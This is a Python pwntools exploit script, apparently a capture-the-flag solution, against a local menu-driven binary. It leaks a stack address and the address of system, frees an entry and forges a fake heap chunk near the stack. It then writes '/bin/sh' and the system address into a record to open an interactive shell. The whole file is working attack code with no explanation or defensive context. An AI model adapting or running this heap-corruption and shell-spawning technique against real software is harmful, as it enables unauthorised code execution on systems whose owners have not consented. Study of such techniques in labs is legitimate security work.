from pwn import *


s = process("./31a94797b9")

s.recvuntil('>')
s.sendline('2')
s.recvuntil('>')
s.sendline('1')
s.recvuntil(' : ')
s.sendline('1234')
s.recvuntil(' : ')
s.sendline('a'*8)
#one register
s.recvuntil('>')
s.sendline('5')
s.recvuntil('>')
s.sendline('1')
s.recvuntil('>')
s.sendline('1')
s.recvuntil('>')
s.sendline('2')
#earn score
s.recvuntil('>')
s.sendline('4')
s.recvuntil('>> ')
stack_addr = s.recvuntil('\n')
stack_addr = int(stack_addr,16)
log.info('stack_addr : '+hex(stack_addr))
s.recvuntil('>')
s.sendline('415')
s.sendline('404')
s.recvuntil(' : ')
system_addr = s.recvuntil('\n')
system_addr = int(system_addr,16)
log.info('system_addr : '+hex(system_addr))
fake_chunk = stack_addr - 0x18
s.recvuntil('>')
s.sendline('3')
s.recvuntil('>')
s.sendline('1')
#one delete

s.recvuntil('>')
s.sendline('2')
s.recvuntil(' : ')
s.sendline('1')
s.recvuntil('>')
s.sendline('2')
s.recvuntil(' : ')
s.sendline(p64(fake_chunk))
log.info('fake_chunk : '+hex(fake_chunk))
#forging chunk

s.recvuntil('>')
s.sendline('1')
s.recvuntil(' : ')
s.sendline('1234')
s.recvuntil(' : ')
s.sendline('a'*8)
s.recvuntil('>')
#re_create
log.info('exploit---')
s.sendline('1')
s.recvuntil('ID : ')
s.sendline('64')
s.recvuntil('NAME : ')
s.sendline('/bin/sh\x0a'*3+p64(system_addr))
#print s.recvuntil('>')
#re_create
s.interactive()
